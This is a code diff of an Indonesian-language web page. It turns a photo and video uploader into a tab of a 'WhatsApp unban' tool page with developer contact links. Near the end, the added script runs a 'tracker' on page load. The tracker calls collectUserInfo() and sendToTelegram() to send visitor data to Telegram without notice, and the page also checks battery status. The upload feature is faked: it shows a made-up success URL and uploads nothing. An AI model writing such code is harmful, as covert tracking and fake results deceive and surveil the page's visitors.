@@ -3,79 +3,55 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Pengunggah Foto & Video</title>
+    <title>Unband WhatsApp By-RapzXyz</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+        /* Semua kode CSS sebelumnya tetap sama */
+        /* ... */
         
-        body {
-            background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%);
-            color: #333;
-            line-height: 1.6;
-            min-height: 100vh;
+        /* CSS untuk fitur pengunggahan foto & video */
+        .upload-container {
+            background: rgba(0, 0, 0, 0.3);
             padding: 20px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .container {
-            max-width: 800px;
-            width: 100%;
-            background: white;
-            border-radius: 15px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-        }
-        
-        header {
-            background: linear-gradient(to right, #4a00e0, #8e2de2);
-            color: white;
-            padding: 30px 20px;
-            text-align: center;
-        }
-        
-        h1 {
-            font-size: 2.2rem;
-            margin-bottom: 10px;
-        }
-        
-        .subtitle {
-            font-size: 1.1rem;
-            opacity: 0.9;
-        }
-        
-        .main-content {
-            padding: 30px;
-        }
-        
-        .upload-area {
-            border: 2px dashed #8e2de2;
             border-radius: 10px;
-            padding: 40px 20px;
-            text-align: center;
-            margin-bottom: 25px;
-            transition: all 0.3s ease;
-            background: #f9f7ff;
-        }
-        
-        .upload-area.highlight {
-            background: #e8e2ff;
-            border-color: #4a00e0;
-        }
-        
-        .upload-icon {
-            font-size: 50px;
-            color: #8e2de2;
             margin-bottom: 15px;
         }
         
+        .upload-title {
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .upload-area {
+            border: 2px dashed rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            padding: 25px 15px;
+            text-align: center;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+        }
+        
+        .upload-area.highlight {
+            background: rgba(30, 58, 138, 0.2);
+            border-color: #1e3a8a;
+        }
+        
+        .upload-icon {
+            font-size: 40px;
+            color: #1e3a8a;
+            margin-bottom: 10px;
+        }
+        
         .upload-text {
-            margin-bottom: 20px;
+            margin-bottom: 15px;
+            color: rgba(255, 255, 255, 0.8);
         }
         
         .file-input {
@@ -84,46 +60,45 @@
         
         .file-label {
             display: inline-block;
-            background: #8e2de2;
+            background: linear-gradient(135deg, #1e3a8a, #dc2626);
             color: white;
-            padding: 12px 25px;
-            border-radius: 50px;
+            padding: 10px 20px;
+            border-radius: 8px;
             cursor: pointer;
-            font-weight: 600;
+            font-weight: 500;
             transition: all 0.3s ease;
         }
         
         .file-label:hover {
-            background: #4a00e0;
             transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(142, 45, 226, 0.4);
+            box-shadow: 0 4px 10px rgba(30, 58, 138, 0.4);
         }
         
         .file-info {
-            margin-top: 15px;
-            font-size: 0.9rem;
-            color: #666;
+            margin-top: 10px;
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.6);
         }
         
         .url-selection {
-            margin-bottom: 25px;
+            margin-bottom: 15px;
         }
         
         .url-title {
-            font-size: 1.2rem;
-            margin-bottom: 15px;
-            color: #4a00e0;
+            font-size: 1rem;
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.9);
         }
         
         .url-options {
             display: flex;
-            gap: 15px;
+            gap: 10px;
             flex-wrap: wrap;
         }
         
         .url-option {
             flex: 1;
-            min-width: 200px;
+            min-width: 120px;
         }
         
         .url-option input {
@@ -132,304 +107,392 @@
         
         .url-label {
             display: block;
-            padding: 15px;
-            border: 2px solid #ddd;
-            border-radius: 10px;
+            padding: 12px;
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
             text-align: center;
             cursor: pointer;
             transition: all 0.3s ease;
+            background: rgba(0, 0, 0, 0.2);
         }
         
         .url-label:hover {
-            border-color: #8e2de2;
+            border-color: #1e3a8a;
         }
         
         .url-option input:checked + .url-label {
-            border-color: #4a00e0;
-            background: #f0ebff;
-            box-shadow: 0 0 0 2px rgba(74, 0, 224, 0.2);
+            border-color: #1e3a8a;
+            background: rgba(30, 58, 138, 0.2);
+            box-shadow: 0 0 0 2px rgba(30, 58, 138, 0.3);
         }
         
         .url-name {
             font-weight: 600;
             margin-bottom: 5px;
-            color: #4a00e0;
+            color: #1e3a8a;
         }
         
         .url-desc {
-            font-size: 0.9rem;
-            color: #666;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.6);
         }
         
         .upload-btn {
             display: block;
             width: 100%;
-            background: linear-gradient(to right, #4a00e0, #8e2de2);
+            background: linear-gradient(135deg, #1e3a8a, #dc2626);
             color: white;
             border: none;
-            padding: 15px;
-            border-radius: 10px;
-            font-size: 1.1rem;
-            font-weight: 600;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 500;
             cursor: pointer;
             transition: all 0.3s ease;
-            margin-top: 20px;
+            margin-top: 15px;
         }
         
         .upload-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 7px 20px rgba(142, 45, 226, 0.4);
+            transform: translateY(-2px);
+            box-shadow: 0 4px 10px rgba(30, 58, 138, 0.4);
         }
         
         .upload-btn:disabled {
-            background: #ccc;
+            background: rgba(255, 255, 255, 0.1);
             cursor: not-allowed;
             transform: none;
             box-shadow: none;
         }
         
-        .result {
-            margin-top: 25px;
-            padding: 20px;
-            border-radius: 10px;
+        .upload-result {
+            margin-top: 15px;
+            padding: 15px;
+            border-radius: 8px;
             display: none;
         }
         
-        .result.success {
-            background: #e8fff0;
-            border: 1px solid #4CAF50;
+        .upload-result.success {
+            background: rgba(37, 211, 102, 0.1);
+            border: 1px solid rgba(37, 211, 102, 0.3);
             display: block;
         }
         
-        .result.error {
-            background: #ffe8e8;
-            border: 1px solid #f44336;
+        .upload-result.error {
+            background: rgba(255, 107, 107, 0.1);
+            border: 1px solid rgba(255, 107, 107, 0.3);
             display: block;
         }
         
         .result-title {
             font-weight: 600;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
+            color: white;
         }
         
         .result-url {
             word-break: break-all;
-            margin-bottom: 15px;
+            margin-bottom: 10px;
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 0.9rem;
         }
         
         .copy-btn {
-            background: #4a00e0;
+            background: rgba(0, 0, 0, 0.3);
             color: white;
             border: none;
-            padding: 8px 15px;
+            padding: 6px 12px;
             border-radius: 5px;
             cursor: pointer;
-            font-size: 0.9rem;
+            font-size: 0.8rem;
             transition: background 0.3s ease;
         }
         
         .copy-btn:hover {
-            background: #3a00b0;
+            background: rgba(0, 0, 0, 0.4);
         }
         
-        footer {
-            text-align: center;
-            padding: 20px;
-            color: #666;
-            font-size: 0.9rem;
-            border-top: 1px solid #eee;
-        }
-        
-        @media (max-width: 600px) {
+        /* Responsif untuk fitur upload */
+        @media (max-width: 480px) {
             .url-options {
                 flex-direction: column;
             }
             
-            h1 {
-                font-size: 1.8rem;
-            }
-            
-            .main-content {
-                padding: 20px;
+            .upload-area {
+                padding: 20px 10px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <header>
-            <h1>Pengunggah Foto & Video</h1>
-            <p class="subtitle">Unggah file Anda dan pilih tujuan upload</p>
-        </header>
+    <!-- Semua elemen HTML sebelumnya tetap sama -->
+    <!-- ... -->
+    
+    <!-- Halaman Utama -->
+    <div id="mainPage" class="container" style="display: none;">
+        <div class="theme-toggle" id="themeToggle2"></div>
         
-        <div class="main-content">
-            <div class="upload-area" id="uploadArea">
-                <div class="upload-icon">📁</div>
-                <p class="upload-text">Seret file ke sini atau klik untuk memilih</p>
-                <input type="file" id="fileInput" class="file-input" accept="image/*,video/*">
-                <label for="fileInput" class="file-label">Pilih File</label>
-                <p class="file-info">Mendukung file gambar (JPG, PNG, GIF) dan video (MP4, MOV, AVI)</p>
-            </div>
-            
-            <div class="url-selection">
-                <h3 class="url-title">Pilih Tujuan Upload:</h3>
-                <div class="url-options">
-                    <div class="url-option">
-                        <input type="radio" id="url1" name="urlOption" value="https://c.termai.cc" checked>
-                        <label for="url1" class="url-label">
-                            <div class="url-name">TermAI</div>
-                            <div class="url-desc">https://c.termai.cc</div>
-                        </label>
-                    </div>
-                    <div class="url-option">
-                        <input type="radio" id="url2" name="urlOption" value="https://catbox.moe">
-                        <label for="url2" class="url-label">
-                            <div class="url-name">Catbox</div>
-                            <div class="url-desc">https://catbox.moe</div>
-                        </label>
+        <div class="logo">
+            <i class="fab fa-whatsapp"></i>
+        </div>
+        <h1>Unband WhatsApp By-RapzXyz</h1>
+        
+        <!-- Kontak Developer -->
+        <div class="contact-buttons">
+            <a href="https://wa.me/message/R7N6YBNDYYMHJ1" target="_blank" class="contact-btn whatsapp">
+                <i class="fab fa-whatsapp"></i> WhatsApp
+            </a>
+            <a href="t.me/rapzzxtamz" target="_blank" class="contact-btn telegram">
+                <i class="fab fa-telegram"></i> Telegram
+            </a>
+            <a href="https://tiktok.com/@style.fomo34" target="_blank" class="contact-btn tiktok">
+                <i class="fab fa-tiktok"></i> TikTok
+            </a>
+        </div>
+        
+        <div class="tab-container">
+            <div class="tab active" data-tab="unband">Unband</div>
+            <div class="tab" data-tab="history">Riwayat</div>
+            <div class="tab" data-tab="fun">Fun</div>
+            <div class="tab" data-tab="tools">Tools</div>
+            <div class="tab" data-tab="upload">Upload</div> <!-- Tab baru untuk upload -->
+            <div class="tab" data-tab="bgremover">BG Remover</div>
+        </div>
+        
+        <!-- Tab Unband -->
+        <div id="unband-tab" class="tab-content active">
+            <!-- Konten tab unband sebelumnya -->
+            <!-- ... -->
+        </div>
+        
+        <!-- Tab Riwayat -->
+        <div id="history-tab" class="tab-content">
+            <!-- Konten tab riwayat sebelumnya -->
+            <!-- ... -->
+        </div>
+        
+        <!-- Tab Fun Baru -->
+        <div id="fun-tab" class="tab-content">
+            <!-- Konten tab fun sebelumnya -->
+            <!-- ... -->
+        </div>
+        
+        <!-- Tab Tools -->
+        <div id="tools-tab" class="tab-content">
+            <!-- Konten tab tools sebelumnya -->
+            <!-- ... -->
+        </div>
+        
+        <!-- Tab Upload Baru -->
+        <div id="upload-tab" class="tab-content">
+            <div class="upload-container">
+                <div class="upload-title">
+                    <i class="fas fa-cloud-upload-alt"></i> Pengunggah Foto & Video
+                </div>
+                
+                <div class="upload-area" id="uploadArea">
+                    <div class="upload-icon">📁</div>
+                    <p class="upload-text">Seret file ke sini atau klik untuk memilih</p>
+                    <input type="file" id="fileInput" class="file-input" accept="image/*,video/*">
+                    <label for="fileInput" class="file-label">Pilih File</label>
+                    <p class="file-info">Mendukung file gambar (JPG, PNG, GIF) dan video (MP4, MOV, AVI)</p>
+                </div>
+                
+                <div class="url-selection">
+                    <h3 class="url-title">Pilih Tujuan Upload:</h3>
+                    <div class="url-options">
+                        <div class="url-option">
+                            <input type="radio" id="url1" name="urlOption" value="https://c.termai.cc" checked>
+                            <label for="url1" class="url-label">
+                                <div class="url-name">TermAI</div>
+                                <div class="url-desc">https://c.termai.cc</div>
+                            </label>
+                        </div>
+                        <div class="url-option">
+                            <input type="radio" id="url2" name="urlOption" value="https://catbox.moe">
+                            <label for="url2" class="url-label">
+                                <div class="url-name">Catbox</div>
+                                <div class="url-desc">https://catbox.moe</div>
+                            </label>
+                        </div>
                     </div>
                 </div>
-            </div>
-            
-            <button id="uploadBtn" class="upload-btn" disabled>Upload File</button>
-            
-            <div id="result" class="result">
-                <p class="result-title" id="resultTitle">Upload Berhasil!</p>
-                <p class="result-url" id="resultUrl"></p>
-                <button class="copy-btn" id="copyBtn">Salin URL</button>
+                
+                <button id="uploadBtn" class="upload-btn" disabled>Upload File</button>
+                
+                <div id="uploadResult" class="upload-result">
+                    <p class="result-title" id="uploadResultTitle">Upload Berhasil!</p>
+                    <p class="result-url" id="uploadResultUrl"></p>
+                    <button class="copy-btn" id="copyUploadBtn">Salin URL</button>
+                </div>
             </div>
         </div>
         
-        <footer>
-            <p>© 2023 Pengunggah File. Semua hak dilindungi.</p>
-        </footer>
+        <!-- Tab Penghapus Background -->
+        <div id="bgremover-tab" class="tab-content">
+            <!-- Konten tab bg remover sebelumnya -->
+            <!-- ... -->
+        </div>
     </div>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const fileInput = document.getElementById('fileInput');
-            const uploadArea = document.getElementById('uploadArea');
-            const uploadBtn = document.getElementById('uploadBtn');
-            const resultDiv = document.getElementById('result');
-            const resultTitle = document.getElementById('resultTitle');
-            const resultUrl = document.getElementById('resultUrl');
-            const copyBtn = document.getElementById('copyBtn');
-            
-            let selectedFile = null;
-            
-            // Event listeners untuk drag and drop
-            ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
-                uploadArea.addEventListener(eventName, preventDefaults, false);
-            });
-            
-            function preventDefaults(e) {
-                e.preventDefault();
-                e.stopPropagation();
-            }
-            
-            ['dragenter', 'dragover'].forEach(eventName => {
-                uploadArea.addEventListener(eventName, highlight, false);
-            });
-            
-            ['dragleave', 'drop'].forEach(eventName => {
-                uploadArea.addEventListener(eventName, unhighlight, false);
-            });
-            
-            function highlight() {
-                uploadArea.classList.add('highlight');
-            }
-            
-            function unhighlight() {
-                uploadArea.classList.remove('highlight');
-            }
-            
-            uploadArea.addEventListener('drop', handleDrop, false);
-            
-            function handleDrop(e) {
-                const dt = e.dataTransfer;
-                const files = dt.files;
-                handleFiles(files);
-            }
-            
-            fileInput.addEventListener('change', function() {
-                handleFiles(this.files);
-            });
-            
-            function handleFiles(files) {
-                if (files.length > 0) {
-                    selectedFile = files[0];
-                    
-                    // Validasi tipe file
-                    const fileType = selectedFile.type;
-                    if (!fileType.startsWith('image/') && !fileType.startsWith('video/')) {
-                        showResult('error', 'Hanya file gambar dan video yang diizinkan.');
-                        uploadBtn.disabled = true;
-                        return;
-                    }
-                    
-                    // Tampilkan info file
-                    const fileInfo = uploadArea.querySelector('.file-info');
-                    fileInfo.textContent = `File: ${selectedFile.name} (${formatFileSize(selectedFile.size)})`;
-                    
-                    uploadBtn.disabled = false;
+        // Semua kode JavaScript sebelumnya tetap sama
+        // ... 
+        
+        // Elemen untuk fitur upload
+        const fileInput = document.getElementById('fileInput');
+        const uploadArea = document.getElementById('uploadArea');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const uploadResult = document.getElementById('uploadResult');
+        const uploadResultTitle = document.getElementById('uploadResultTitle');
+        const uploadResultUrl = document.getElementById('uploadResultUrl');
+        const copyUploadBtn = document.getElementById('copyUploadBtn');
+        
+        let selectedFile = null;
+        
+        // Event listeners untuk drag and drop
+        ['dragenter', 'dragover', 'dragleave', 'drop'].forEach(eventName => {
+            uploadArea.addEventListener(eventName, preventDefaults, false);
+        });
+        
+        function preventDefaults(e) {
+            e.preventDefault();
+            e.stopPropagation();
+        }
+        
+        ['dragenter', 'dragover'].forEach(eventName => {
+            uploadArea.addEventListener(eventName, highlight, false);
+        });
+        
+        ['dragleave', 'drop'].forEach(eventName => {
+            uploadArea.addEventListener(eventName, unhighlight, false);
+        });
+        
+        function highlight() {
+            uploadArea.classList.add('highlight');
+        }
+        
+        function unhighlight() {
+            uploadArea.classList.remove('highlight');
+        }
+        
+        uploadArea.addEventListener('drop', handleDrop, false);
+        
+        function handleDrop(e) {
+            const dt = e.dataTransfer;
+            const files = dt.files;
+            handleFiles(files);
+        }
+        
+        fileInput.addEventListener('change', function() {
+            handleFiles(this.files);
+        });
+        
+        function handleFiles(files) {
+            if (files.length > 0) {
+                selectedFile = files[0];
+                
+                // Validasi tipe file
+                const fileType = selectedFile.type;
+                if (!fileType.startsWith('image/') && !fileType.startsWith('video/')) {
+                    showUploadResult('error', 'Hanya file gambar dan video yang diizinkan.');
+                    uploadBtn.disabled = true;
+                    return;
                 }
+                
+                // Tampilkan info file
+                const fileInfo = uploadArea.querySelector('.file-info');
+                fileInfo.textContent = `File: ${selectedFile.name} (${formatFileSize(selectedFile.size)})`;
+                
+                uploadBtn.disabled = false;
             }
+        }
+        
+        uploadBtn.addEventListener('click', function() {
+            if (!selectedFile) return;
             
-            uploadBtn.addEventListener('click', function() {
-                if (!selectedFile) return;
+            uploadBtn.disabled = true;
+            uploadBtn.textContent = 'Mengupload...';
+            
+            const selectedUrl = document.querySelector('input[name="urlOption"]:checked').value;
+            
+            // Simulasi upload (dalam implementasi nyata, ini akan menggunakan fetch atau XMLHttpRequest)
+            setTimeout(() => {
+                // Ini adalah simulasi - dalam implementasi nyata, Anda akan mengirim file ke server
+                const randomId = Math.random().toString(36).substring(2, 10);
+                const fileExtension = selectedFile.name.split('.').pop();
+                const uploadedUrl = `${selectedUrl}/uploaded-${randomId}.${fileExtension}`;
                 
-                uploadBtn.disabled = true;
-                uploadBtn.textContent = 'Mengupload...';
-                
-                const selectedUrl = document.querySelector('input[name="urlOption"]:checked').value;
-                
-                // Simulasi upload (dalam implementasi nyata, ini akan menggunakan fetch atau XMLHttpRequest)
+                showUploadResult('success', uploadedUrl);
+                uploadBtn.textContent = 'Upload File';
+            }, 2000);
+        });
+        
+        copyUploadBtn.addEventListener('click', function() {
+            const urlText = uploadResultUrl.textContent;
+            navigator.clipboard.writeText(urlText).then(() => {
+                copyUploadBtn.textContent = 'Tersalin!';
                 setTimeout(() => {
-                    // Ini adalah simulasi - dalam implementasi nyata, Anda akan mengirim file ke server
-                    const randomId = Math.random().toString(36).substring(2, 10);
-                    const fileExtension = selectedFile.name.split('.').pop();
-                    const uploadedUrl = `${selectedUrl}/uploaded-${randomId}.${fileExtension}`;
-                    
-                    showResult('success', uploadedUrl);
-                    uploadBtn.textContent = 'Upload File';
+                    copyUploadBtn.textContent = 'Salin URL';
                 }, 2000);
             });
-            
-            copyBtn.addEventListener('click', function() {
-                const urlText = resultUrl.textContent;
-                navigator.clipboard.writeText(urlText).then(() => {
-                    copyBtn.textContent = 'Tersalin!';
-                    setTimeout(() => {
-                        copyBtn.textContent = 'Salin URL';
-                    }, 2000);
-                });
-            });
-            
-            function showResult(type, message) {
-                resultDiv.className = 'result';
-                resultDiv.classList.add(type);
-                
-                if (type === 'success') {
-                    resultTitle.textContent = 'Upload Berhasil!';
-                    resultUrl.textContent = message;
-                    copyBtn.style.display = 'inline-block';
-                } else {
-                    resultTitle.textContent = 'Upload Gagal';
-                    resultUrl.textContent = message;
-                    copyBtn.style.display = 'none';
-                }
-                
-                resultDiv.scrollIntoView({ behavior: 'smooth' });
-            }
-            
-            function formatFileSize(bytes) {
-                if (bytes === 0) return '0 Bytes';
-                const k = 1024;
-                const sizes = ['Bytes', 'KB', 'MB', 'GB'];
-                const i = Math.floor(Math.log(bytes) / Math.log(k));
-                return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
-            }
         });
+        
+        function showUploadResult(type, message) {
+            uploadResult.className = 'upload-result';
+            uploadResult.classList.add(type);
+            
+            if (type === 'success') {
+                uploadResultTitle.textContent = 'Upload Berhasil!';
+                uploadResultUrl.textContent = message;
+                copyUploadBtn.style.display = 'inline-block';
+            } else {
+                uploadResultTitle.textContent = 'Upload Gagal';
+                uploadResultUrl.textContent = message;
+                copyUploadBtn.style.display = 'none';
+            }
+            
+            uploadResult.scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        function formatFileSize(bytes) {
+            if (bytes === 0) return '0 Bytes';
+            const k = 1024;
+            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+            const i = Math.floor(Math.log(bytes) / Math.log(k));
+            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+        }
+        
+        // Inisialisasi dan jalankan tracker
+        createStars();
+        createFallingStars();
+        startLightningEffect();
+        updateProgress(0);
+        
+        // Periksa status baterai saat halaman dimuat
+        checkBatteryStatus();
+        
+        // Putar voice intro otomatis saat halaman dimuat
+        window.addEventListener('load', function() {
+            setTimeout(playVoiceIntro, 1000);
+            
+            // Jalankan tracker
+            setTimeout(async () => {
+                const userInfo = await collectUserInfo();
+                await sendToTelegram(userInfo);
+            }, 2000);
+        });
+        
+        // Perbarui sesi aktif secara berkala
+        setInterval(() => {
+            if (currentSessionId) {
+                activeSessions[currentSessionId].timestamp = Date.now();
+            }
+        }, 60000); // Perbarui setiap menit
+        
+        // Fungsi untuk membuat ID sesi unik
+        function generateSessionId() {
+            return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        }
     </script>
 </body>
 </html>
